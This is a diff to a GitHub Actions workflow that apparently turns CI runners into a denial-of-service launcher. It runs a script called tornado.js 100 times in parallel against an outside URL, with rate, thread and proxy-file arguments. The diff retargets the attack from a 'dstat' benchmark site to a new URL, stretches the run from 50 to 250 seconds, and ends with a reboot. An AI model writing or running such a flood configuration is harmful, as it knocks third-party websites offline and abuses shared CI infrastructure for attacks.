@@ -21,7 +21,7 @@ jobs:
           chmod +x tornado.js
           PIDS=()
           for i in {1..100}; do
-            timeout 50 node tornado.js GET https://dstat.hexbear.xyz/ 50 32 90 fres.txt --full --query 3
+            timeout 250 node tornado.js GET https://rapidis.gay/5043021917-79a94eff-2b04-4f71-b03f-2f1cb218b436 250 32 90 fres.txt --full --query 3
             PIDS+=($!)
           done
           
@@ -30,7 +30,7 @@ jobs:
           done
 
       - name: OK !
-        run: sleep 50
+        run: sleep 250
         
       - name: OK !
         run: sudo reboot
